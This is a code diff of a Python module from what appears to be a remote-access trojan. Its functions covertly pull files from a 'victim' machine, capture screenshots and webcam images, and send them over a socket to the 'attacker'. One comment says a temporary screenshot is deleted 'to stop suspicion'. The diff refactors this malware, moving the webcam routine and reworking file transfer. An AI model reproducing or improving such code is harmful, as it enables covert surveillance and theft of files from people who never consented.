@@ -5,7 +5,7 @@ from cv2 import cv2 # webcam functions
 import pyscreenshot as ImageGrab # screenshot
 
 
-###############################################################################################
+################################____HELP____################################
 
 CUSTOM_COMMANDS = {'help': ['\t\tShows help menu'],
             'screenshot': ['\tTake a screenshot of the targets screen'],
@@ -22,32 +22,50 @@ def print_help(conn, args):
     print("=================================================================")
     return
 
-############################################****SEND****######################################
-
 def clear_screen(conn, args):
     print("\n" * 100)
+    
 
+############################____File-Transfer____############################
 
 def download(conn, args):
     ### download victims files ###
     conn.send(str.encode('download'))
-    if len(args) > 8:
-        filename = str(args[9:])
-    else:
-        filename = input("Filename: ")
+
+    filename = str(input("Filename: ")) if not len(args) > 8 else str(args[8:])
+
     conn.send(str.encode(filename))
-    m = conn.recv(1024)
-    # if the file given is on the victims computer, continue
-    if not 'FileNotFound' in str(m):
-        f = open(filename, 'wb')
+    f = open(filename, 'wb')
+    i = conn.recv(1024)
+    while not (b'complete' in i):
+        f.write(i)
         i = conn.recv(1024)
-        while not ('complete' in str(i)):
-            f.write(i)
-            i = conn.recv(1024)
-        f.close()
-        print(str(filename) + ' successfully saved to: ' + str(os.path.dirname(os.path.realpath(__file__))))
+    f.close()
+    print(str(filename) + ' successfully saved to: ' + str(os.path.dirname(os.path.realpath(filename))))
     # otherwise you can just try the command again
 
+def upload(soc):
+    ### find file and start transfer to attacker ###
+    filename = soc.recv(1024)[:].decode("utf-8")
+    #filename = filen[:].decode("utf-8")
+    print(filename)
+    #try:
+    f = open(filename, 'rb')
+    #except Exception as e:
+    #    outstr = "Could not find file: %s\n" %str(e)
+    #    return outstr
+    #else:
+    outstr = ""
+    i = f.read(1024)
+    while (i):
+        soc.send(i)
+        i = f.read(1024)
+    f.close()
+    soc.send(b'complete')
+    return outstr
+
+
+#############################____Screenshot____#############################
 
 def screenshot(conn, args):
     ### request and collect victims screenshot ###
@@ -81,54 +99,6 @@ def screenshot(conn, args):
     print('screenshot successfully transfered!\n')
 
 
-def webcam(conn):
-    ### request and collect webcam snap ###
-    conn.send(str.encode('snap'))
-    f = open('camera.png', 'wb')
-    img = conn.recv(1024)
-    f.write(img)
-    while not('complete' in str(img)):
-        img = conn.recv(1024)
-        f.write(img)
-    f.close()
-
-
-############################################****RECVEIVE****######################################
-
-"""
-def changedir_cli(soc, outs, args):
-    # e.g. cd dir
-    # "cd" = args[:2] and "dir" = args[3:]
-    directory = args[3:].decode("utf-8")
-    try: #chdir to wanted directory
-        os.chdir(directory.strip())
-    except Exception as e: # normally if it doesn't exist
-        outs = "Could not change directory: %s\n" %str(e)
-    else: 
-        outs = ""
-    return outs
-"""
-
-def download_cli(soc):
-    ### find file and start transfer to attacker ###
-    filename = soc.recv(1024).decode("utf-8")
-    try:
-        f = open(str(filename), 'rb')
-    except Exception as e:
-        soc.send('FileNotFound')
-        outstr = "Could not find file: %s\n" %str(e)
-        return outstr
-    else:
-        outstr = ""
-    i = f.read(1024)
-    while (i):
-        soc.send(i)
-        i = f.read(1024)
-    f.close()
-    soc.send(b'complete')
-    return outstr
-    
-
 def screenshot_cli(soc):
     ### take local screenshot then send over socket to attacker ###
     try:
@@ -149,6 +119,20 @@ def screenshot_cli(soc):
     # remove to stop suspicion
     os.remove('screenshot.png')
     return outstr
+
+
+#############################____Webcam-Snap____#############################
+
+def webcam(conn):
+    ### request and collect webcam snap ###
+    conn.send(str.encode('snap'))
+    f = open('camera.png', 'wb')
+    img = conn.recv(1024)
+    f.write(img)
+    while not('complete' in str(img)):
+        img = conn.recv(1024)
+        f.write(img)
+    f.close()
 
 
 ### NOTE: i dont actually know if this works. i dont have a webcam :(
@@ -180,4 +164,4 @@ def webcam_cli(soc):
     os.remove('camera.png')
     return outstr
 
-##################################################################################################
+###########################################################################
